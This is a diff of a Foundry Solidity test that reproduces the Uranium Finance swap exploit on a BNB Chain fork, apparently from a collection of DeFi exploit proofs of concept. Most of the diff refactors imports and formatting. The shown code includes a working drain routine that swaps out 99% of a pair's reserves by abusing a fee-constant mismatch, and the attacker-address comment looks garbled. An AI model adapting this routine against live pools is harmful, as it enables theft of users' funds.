@@ -2,8 +2,9 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
-
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IUniswapV2Factory} from "src/interfaces/IUniswapV2Factory.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
 // @KeyInfo - Total Lost : $50 M
 // Attacker : 0xd9936EA91a461aA4B727a7e0xc47bdd0a852a88a019385ea3ff57cf8de79f019d3661bcD6cD257481c
 // AttackContract : 0x2b528a28451e9853f51616f3b0f6d82af8bea6ae
@@ -21,21 +22,17 @@ Vuln code:
 Critically, we see in Uranium’s implementation that the magic value for fee calculation is 10000 instead of the original 1000. 
 The check does not apply the new magic value and instead uses the original 1000. 
 This means that the K after a swap is guaranteed to be 100 times larger than the K before the swap when no token balance changes have occurred.*/
-CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
 address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
 address constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
 
 interface IWrappedNative {
-
     function deposit() external payable;
-
 }
 
 contract Exploit is Test {
-
     function setUp() public {
-        cheat.createSelectFork("bsc", 6_920_000);
+        vm.createSelectFork("bsc", 6_920_000);
     }
 
     function testExploit() public {
@@ -51,12 +48,19 @@ contract Exploit is Test {
         console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(this)));
     }
 
-    function takeFunds(address token0, address token1, uint256 amount) internal {
+    function takeFunds(
+        address token0,
+        address token1,
+        uint256 amount
+    ) internal {
         IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
-        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(token1), address(token0)));
+        IUniswapV2Pair pair = IUniswapV2Pair(
+            factory.getPair(address(token1), address(token0))
+        );
 
         IERC20(token0).transfer(address(pair), amount);
-        uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;
+        uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) /
+            100;
 
         pair.swap(
             pair.token0() == address(token1) ? amountOut : 0,
@@ -65,5 +69,4 @@ contract Exploit is Test {
             new bytes(0)
         );
     }
-
 }
